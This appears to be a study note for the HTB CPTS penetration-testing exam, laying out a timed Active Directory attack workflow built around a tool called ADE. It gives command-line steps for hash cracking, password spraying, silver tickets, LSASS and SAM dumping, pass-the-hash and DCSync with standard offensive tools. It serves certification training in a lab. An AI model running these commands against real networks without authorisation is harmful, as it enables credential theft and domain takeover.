---
tags: [ade, cpts, exam, quick-reference, methodology]
---

# CPTS Exam Guide

Time-optimized AD enumeration strategy for the HTB CPTS exam.

## Pre-Exam Checklist

- [ ] ADE installed (`ade --help`)
- [ ] All [[Dependencies]] installed (`ade -r 127.0.0.1` checks them)
- [ ] Wordlists available: `rockyou.txt`, `seclists`
- [ ] BloodHound CE installed (`sudo bloodhound-ce`)
- [ ] Notes template ready (CherryTree, Obsidian, Notion)

## Phase 1: Initial Recon (~10 min)

Run these in parallel if possible. No credentials needed.

```bash
# Terminal 1: ADE recon
ade -r <dc-ip> -o loot

# This runs: discovery, ldap, smb (anonymous), asrep (roasting + spraying),
#           smb-signing, gpp, summary
```

**Expected output:**
- Domain name, FQDN
- `users.txt` with enumerated accounts
- `asrep_hashes.txt` (if any roastable accounts)
- SMB share listing
- SMB signing status
- `gpp_passwords.txt` (if SYSVOL has stale GPP credentials — instant win, no cracking)

**While that runs:**
```bash
# Terminal 2: Port scan
nmap -sC -sV -p- <dc-ip> -oN loot/nmap_full.txt

# Terminal 3: Start BloodHound CE
sudo bloodhound-ce
```

## Phase 2: Credentialed Enumeration (~15 min)

Once you have credentials:

```bash
ade -r <dc-ip> -u <user> -p <pass> -d <domain> -f <fqdn> \
  --skip bloodhound \
  -o loot
```

> **Skip BloodHound initially** — it's slow. Run it separately.

**Expected output:**
- [[creds]] validates credentials
- [[kerberoast]] → `kerberoast_hashes.txt`
- [[bloodyad]] → writable objects
- [[adcs]] → certipy findings
- [[smb]] → authenticated share access
- [[maq]] → machine account quota
- [[laps]] → `laps_passwords.txt` (instant local admin creds, if readable)
- [[summary]] → full report in `ade_summary.txt`

## Phase 3: Crack + Exploit (~20 min)

```bash
# Crack AS-REP hashes (fast)
hashcat -m 18200 loot/asrep_hashes.txt /usr/share/wordlists/rockyou.txt --force

# Crack Kerberoast hashes (slower)
hashcat -m 13100 loot/kerberoast_hashes.txt /usr/share/wordlists/rockyou.txt --force
```

### If Hashes Crack

1. If AS-REP account cracked → spray password with cme:
   ```bash
   crackmapexec smb <dc-ip> -u loot/users.txt -p '<password>' --continue-on-success
   ```

2. If Kerberoast account cracked → check if in privileged groups (BloodHound)
   ```bash
   # Get silver ticket if needed
   ticketer.py -domain-sid <sid> -domain <domain> \
     -spn <spn> -user-id <rid> <user>
   ```

### If ADCS Vulnerable

See [[Attack Paths#From ADCS (Certipy)]].

### If MAQ > 0

See [[Attack Paths#From MachineAccountQuota]].

## Phase 4: BloodHound (background)

```bash
# Run in background while you work on other paths
ade -r <dc-ip> -u <user> -p <pass> -d <domain> -f <fqdn> \
  --modules bloodhound -o loot &
```

**Check periodically:**
1. Upload ZIP to BloodHound CE
2. Run "Shortest Path to Domain Admins"
3. Look for Kerberoastable high-value targets
4. Check ACL abuse paths

## Phase 5: Lateral Movement + Domain Admin

Based on findings:

### From Local Admin
```bash
# Dump LSASS
cme smb <target> -u <user> -p <pass> -M lsassy

# Pass-the-Hash
cme smb <dc-ip> -u <user> -H <ntlm-hash>
```

### From ADCS Cert
```bash
certipy auth -pfx administrator.pfx -dc-ip <dc-ip>
```

### From DCSync Rights
```bash
secretsdump.py <domain>/<user>:'<pass>'@<dc-ip> -just-dc
```

## Time Management

| Phase | Time Budget | Key Action |
|-------|:----------:|------------|
| Recon | 10 min | ADE + nmap scan |
| Auth Enum | 15 min | Credentialed modules, skip BloodHound |
| Crack + Exploit | 20 min | hashcat, spray, ADCS, RBCD |
| BloodHound | 15 min | Run in background, check results |
| Lateral + DA | 30 min | LSASS dump, PtH, DCSync |
| **Total** | **~90 min** | |

## Common Pitfalls

1. **Running BloodHound too early** — do it in background
2. **Not cracking while enumerating** — hashcat should run in parallel
3. **Not checking SMB signing** — don't waste time on relay if signing is required
4. **Not reading `ade_summary.txt`** — it has the complete attack path recommendation
5. **Waiting too long before credential spray** — labs take ~5 min to spin up fully

## Quick Command Cheatsheet

```bash
# Spray one password
crackmapexec smb <dc-ip> -u loot/users.txt -p '<password>' --continue-on-success

# Check local admin on target
crackmapexec smb <target> -u <user> -p '<pass>' -x 'whoami'

# Dump SAM
crackmapexec smb <target> -u <user> -p '<pass>' --sam

# Kerberos authentication
export KRB5CCNAME=loot/<user>.ccache
smbclient.py -k <fqdn>

# NTDS dump (when Domain Admin)
secretsdump.py <domain>/<user>:'<pass>'@<dc-ip> -just-dc
```

## Related

- [[Attack Paths]] — detailed escalation guides
- [[Workflows#CPTS Exam]] — module selection for exam phases
- [[Output Artifacts]] — understanding your loot
- [[ADE]] — back to hub
